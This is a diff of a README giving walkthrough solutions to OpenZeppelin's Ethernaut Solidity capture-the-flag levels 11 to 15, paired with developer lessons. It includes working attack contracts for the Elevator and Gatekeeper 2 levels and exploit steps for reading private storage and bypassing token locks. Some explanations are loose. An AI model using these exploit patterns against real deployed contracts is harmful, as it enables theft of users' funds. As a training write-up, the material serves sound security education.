@@ -1,6 +1,6 @@
 # Ethernauts Solutions!
 
-This is a series of a (mostly) self-created solutions for the famous Ethernauts series by OpenZeppelin. Ethernauts is a great "capture-the-flag" style educational series designed to train Solidity developers in identifying and (hopefully avoiding) subtle vulnerabilities in contracts. 
+This is a series of solutions for the famous Ethernauts series by OpenZeppelin. Ethernauts is a great "capture-the-flag" style educational series designed to train Solidity developers in identifying and (hopefully avoiding) subtle vulnerabilities in contracts. 
 
 I highly recommend tracking all your transactions with Etherscan and Tenderly. PRs with more efficient solutions are welcome !!
 
@@ -196,13 +196,13 @@ Spoiler alert - making a variable private does not mean only your contract can a
 
 Ethereum Virtual Machine (EVM) is a stack-based Turing-complete machine. This means it is different from your typical computer, which is register-based. The EVM's sotrage scheme is comprised of "stacks" of 32-bytes each. All in all, the EVM can have 2^256 such stacks. 
 
-Each smart contract has its own storage to reflect the state of the contract. The values in storage persist across different function calls. And each storage is tethered to the smart contract’s address. This means, by making a specific EVM-level call, you can access the stacks of each contract. 
+Each smart contract has its own storage to reflect the state of the contract. The values in storage persist across different function calls. And each storage is tethered to the smart contract’s address. This means, by making a specific EVM-level call, you can access the slots of each contract. 
 
  **Vulnerability** - The contract  password is stored as a private variable. 
 
 **Exploit** - 
 
-We know the password is stored as a 32-byes value. So, it will have a whole stack associated with it. In this case, this will be the stack at index 1.
+We know the password is stored as a 32-byes value. So, it will have a whole slot associated with it. In this case, this will be the slot at index 1.
 
     web3.eth.getStorageAt(/* contractAddress */, 1)
         
@@ -311,5 +311,193 @@ Step 2 - Call the withdrawal function repeatedly till the contract is safely out
     
     }
      
+**Learning** - 
+
+- Always follow check-emit-transactions design principle 
+- Add a Re-entrancy lock to your functions if applicable 
+
+## P11 - Elevator 
+
+Interfaces are a useful tool when designing smart contracts. Just like Java or C, interfaces allow a programmer to specify the structure and functionality of a contract, without implementing it. In Solidity, you need interfaces for - 
+
+-   **Designing contracts:**  by generating a working ABI first, before implementing the actual contract.
+-   **Declaring tokens**: by declaring a shared language, so different contracts can use these tokens to handle their business logic.
+-   **Not used**: some developer want to  [scrap interfaces altogether](https://github.com/ethereum/solidity/issues/3420), in favor of abstract classes*.
+
+ **Vulnerability** - `Elevator` does not define function from interface.
+
+**Exploit** - 
+
+Step 1 - Make an implementation of the Building interface.
+Step 2 - Ensure that isLastFloor() always returns false on first invocation. This way, we always enter the `for` loop in Elevator. 
+Step 3 -  isLastFloor() always returns true on second invocation. This way, even if a floor isn't at the top - the contract will think it is. 
+Step 4 -  Instantiate the Elevator contract and play with `goTo()` to see it break. 
+
+    // SPDX-License-Identifier: MIT
+    pragma  solidity  ^0.8.7;
+    
+    interface Building {
+	    function isLastFloor(uint)  external  returns  (bool);
+    }
+    
+    contract ElevatorAttack is Building {
+    
+	    address  public victimContract;
+	    bool  public toggled =  false;
+	    
+	    constructor(address _victimContractAddress)  payable  {
+		    victimContract = _victimContractAddress;
+	    }
+	    
+	    function isLastFloor(uint  /*_floorNumber*/  )  external  override  returns  (bool)  {
+		    if  (toggled)  {
+			    toggled =  false;
+			    return  true;
+		    }  else  {
+			    toggled =  true;
+			    return  false;
+		    }
+	    }
+	    
+	    function attackContract(uint _floorNumber)  external  payable  returns(bool success)  {
+		    (success,  )  = victimContract.call(abi.encodeWithSignature("goTo(uint)", _floorNumber));
+	    }
+	    
+    }
+    
+**Learning** - 
+
+-  Never rely purely on shared interfaces between contracts, or assume two contracts will have the same implementation. 
+-   **Be careful when inheriting contracts that extend from interfaces.** Each layer of abstraction introduces security issues through information obscurity. 
+
+## P12 - Privacy  
+
+The EVM optimizes for a contract to occupy as few slots as possible in order to keep enough space available for execution and other contracts in the system. So, if possible, it stores multiple items of contract data in the same slot. 
+
+![](https://miro.medium.com/max/1400/1*wY8Si-mt_QZWqg0jnEDw8A.jpeg)
+
+In this contract, again, the developer has stored their confidential data in a private variable - all we have to do is extract this data and decipher the password from it. The complication, this time, is the data might be co-habitating in a slot with something else. 
+
+Do remember that constants are not stored in Storage. Also, mappings and dynamic arrays are stored differently. Moreover, each instance of a struct gets its own slot. 
+
+ **Vulnerability** - `data` is still stored in a private variable 
+ 
+**Exploit** - 
+
+Step 1 - Using storage schema described above, predict which slot index the password may be stored in. 
+Step 2 - You should conclude that `data` is stored in slots 3, 4 and 5.
+Step 3 - Take the first 16 bytes of each slot and try to unlock the program using that information. 
+Step 4 - The 5th slot has the password.  
+
+**Learning** - 
+
+-  Do not store plain text information in a contract 
+-  Do not put all data in storage - memory is a safe and gas-efficient way to store transient data. 
+- **Always stack variables together for gas optimization** 
+
+## P13 - Gatekeeper 1  
+
+This problem checks you on a number of levels, including masking bits, sending transactions and estimating gas costs. Let's start with the gas part - 
+
+Solidity's compiler breaks the code you write down into a number of assembly-level instructions. So far, nothing too different from a regular computer. However, interestingly, there is a gas cost associated with each [instruction](https://docs.google.com/spreadsheets/u/1/d/1n6mRqkBz3iWcOlRem_mO09GtSKEKrAsfO7Frgx18pNU/edit#gid=0). 
+
+Different Solidity **compiler versions** will calculate gas differently. And whether or not **optimization** is enabled will also affect gas usage. Moreover, a "write" instruction is more expensive than a "read" instruction. 
+
+Now, let's look at masking. It is important to remember, compression of data does generally lead to the loss of some information - especially when it is de-compressed later. The following infographic explains this quite well - 
+
+![](https://miro.medium.com/max/875/1*iaHciYKXtdk4-Z9tGaiknw.png)
+ 
+ This idea can be implemented in Solidity using bitwise operations - 
+
+    bytes4 a = 0xffffffff;  
+    bytes4 mask = 0xf0f0f0f0;  
+    bytes4 result = a & mask ; // 0xf0f0f0f0
+
+ **Vulnerability** - Contract uses easily exploitable gates 
+
+ **Exploit** - 
+
+Step 1 - Make a bogus contract and exploit `gate 1` through that 
+Step 2 - To solve for `gate 3` simply come up with a mask using your tx.origin and a mask. I found the following to solve the [problem](https://www.tutorialspoint.com/solidity/solidity_conversions.htm). 
+
+    bytes8(tx.origin) & 0xFFFFFFFF0000FFFF;
+
+Step 3 - Finally, to get `gate 2`, I recommend switching to the same compiler version of Remix and then turning gas optimization in Remix off. 
+Step 4 - Do some trial and error with gas provided, till your instructions work. 
+
+**Learning** - 
+
+-  Abstain from asserting gas consumption in your smart contracts, as different compiler settings will yield different results.
+-  Remember, data corruption does happen when converting data types into different sizes.
+
+## P14 - Gatekeeper 2
+
+Ok - now we're getting in deep. Let's start with the fact that the Ethereum yellow paper specifies the act of contract creation as  
+
+![](https://miro.medium.com/max/1400/1*xG42ImBtHKw5AZR1bWcz8Q.png)
+
+When a contract needs to be created, a transaction is sent to the Ethereum network. This contract creates 0 
+
+-   **Sender [s]**: this is the address of the  _immediate_ contract or external wallet that wants to create a new contract.
+-   **Original transactor [o]**: this is the  _original_ EOA (a user) who created the contract. Notice that  `o != s`  if the user used a factory contract to create more contracts!
+-   **Available gas [g]**: this is the user specified, total gas allocated for contract creation.
+-   **Gas price [p]**: this is the market rate for a unit of gas, which converts the transaction cost into Ethers.
+-   **Endowment [v]**: this is the  `value`  (in Wei) that’s being transferred to seed this new contract. The default value is zero.
+-   **Initialization EVM code [i]**: this is everything inside your new contract’s  `constructor`  function and the initialization variables, in bytecode format. 
+
+What follows after is an algorithm that allows your contract to live at a specific address in the EVM - 
+
+1. Based on just the transaction’s input data, the new contract’s designated address is calculated. At this stage, the input state values are modified, but the new contract’s state is still empty.
+
+2. The initialization code kickstarts in the EVM and creates an actual contract.
+
+3. State variables are changed, data is stored, and gas is consumed and deducted.
+
+4. Once the contract finishes initializing, it stores its own code in association with its calculated address.
+
+5. Finally, the remaining gas and a success/failure message is asynchronously returned to the sender  `s`.
+
+So, we must notice that from steps 1 -3, there is no contract code available at the contract's address.  This is confirmed by calling `extcodesize(address)` and getting a value of 0 before step 4 is carried out.  
+
+ **Vulnerability** - Contract depends on other contract to be un-initialized to carry out entry. 
 
 
+  **Exploit** - 
+
+Step 1 - Make a mask to pass `gate 3`
+Step 2 -  To ensure the contract address still comes out with an exit code of 0 for `gate 2` -  simply put the call to the victim contract in the `constructor()`
+
+    // SPDX-License-Identifier: MIT
+    pragma  solidity  ^0.8.7;
+    
+    contract GatekeeperAttack {
+     
+	    constructor(address _victimContractAddress)  {
+		    address gate = _victimContractAddress;
+		    bytes8 key =  bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this)))))  ^  (uint64(0)  -  1));
+		    (bool success,  )  = gate.call(abi.encodeWithSignature("enter(bytes8)", key));
+	    }
+    
+    }
+
+**Learning** - 
+
+-  Understanding how contract creation occurs.
+
+## P15 - Naught Coin 
+
+And we're back to being easy. Naught Coin goes to re-iterate the point that you should nevvvveeer trust a contract that inherits from an interface, unless you are really familiar with the interface and know the inheritor has implemented it correctly. 
+
+ **Vulnerability** -Naught Coin does not implement the transferFrom() and approve() functions in IERC20.
+
+ **Exploit** - 
+
+Step 1 - Enter instance address in Etherscan Rinkeby and connect your wallet.
+Step 2 - `approve()` yourself and `transferFrom()` to another account. 
+
+**Learning** - 
+
+-  Do not trust implementations of unknown interfaces. 
+-  If you can, check for  [EIP 165 compliance](https://eips.ethereum.org/EIPS/eip-165), which confirms which interface an external contract is implementing. Conversely, if you are the one issuing tokens, remember to be EIP-165 compliant.
+
+Note - For a helpful tutorial on ERC 165 to implement in future contracts, please do take a look at [this](https://medium.com/@chiqing/ethereum-standard-erc165-explained-63b54ca0d273) article. 
